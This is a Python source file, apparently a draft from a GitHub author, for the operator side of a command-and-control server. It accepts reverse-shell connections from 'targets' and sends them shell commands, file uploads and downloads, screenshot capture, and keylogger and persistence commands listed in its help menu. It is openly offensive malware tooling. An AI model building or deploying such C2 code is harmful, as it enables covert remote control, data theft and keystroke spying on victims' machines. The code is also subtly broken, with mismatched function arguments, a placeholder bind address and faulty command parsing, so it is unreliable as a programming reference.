################################################################################################################
# Author: astralm0nke on Github (2024)                                                                         #
#----------------------------------------------------- DRAFT --------------------------------------------------#
################################################################################################################
import sys, os, socket, json, threading
from termcolor import colored

def reliable_send(target, data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def download(target, file):
    f = open(file, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

def upload_file(target, file):
    f = open(file, 'rb')
    target.send(f.read()) # don't need to encode because reading bytes
    
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip() # recieve 1024 bytes
            return json.loads(data)
        except ValueError:
            continue

def target_communication():
    count = 0
    while True:
        command = input('* Shell-%s: ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command[:8] == 'download':
            download(command[9:])
        elif command[10:] == 'screenshot':
            f = open('screenshot.png%d' % (count), 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            colored(print('Screenshot saved.'), 'green')
            count += 1
        elif command[:11] == 'persistence':
            pass
        elif command == 'help':
            colored(print('''\n
                          quit                                --> Quit session with target
                          clear                               --> Clear the screen
                          cd *Directory Name                  --> Change directory on target system
                          upload *filename*                   --> Upload file to target machine
                          download *filename*                 --> Download file from target machine
                          screenshot                          --> Screenshot target machine desktop
                          keylog_start                        --> Start keylogger
                          keylog_dump                         --> Print keystrokes from target machine
                          keylog_stop                         --> stop and self destruct keylogger file
                          persistence *Regname* *filename*    --> '''), 'purple')
        else:
            result = target.recv()
            print(result)
    
def accept_connections():
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            colored(print(f'[+] Connected to target: {str(ip)}'), 'green')
        except:
            pass
            
targets = []
ips = []
stop_flag = False
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Local host IP address, port
sock.bind(('str: target_ip', 5555))
sock.listen(5)
## socket descriptor, target machine IP addr, port where connection comes from
t1 = threading.Thread(target=accept_connections)
t1.start()
colored(print('[-_] Listening for incoming connections...'), 'yellow')

while True:
    command = input('[**] Command & Control Center: ')
    if command == 'targets':
        counter = 0
        for ip in ips:
            print('Session' + str(counter) + '----' + str(ip))
            counter += 1
    elif command == 'clear':
        os.system('clear')
    elif command[:7] == 'session':
        try:
            num = int(command[8:])
            tarnum = targets[num]
            tarip = ips[num]
            target_communication(tarnum, tarip)
        except:
            colored(print('[-] No session under that ID.'), 'red')
    elif command == 'exit':
        for target in targets:
            reliable_send(target, 'quit')
            target.close()
        sock.close()
        stop_flag = True
        t1.join()
        break
    elif command[:4] == 'kill':
        targ = targets[int(command[5:])]
        ip = ips[int(command[5:])]
        reliable_send(targ, 'quit')
        targ.close()
        targets.remove(targ)
        ips.remove(ip)
    elif command[:7] == 'sendall':
        x = len(targets)
        print(x)
        i = 0
        try:
            while i < x:
                tarnumber = targets[1]
                print(tarnumber)
                reliable_send(tarnumber, command)
                i += 1
        except:
            colored(print('[!-] Failed'), 'red')
    else:
        colored(print('[!!] Error: Command does not exist.'), 'red')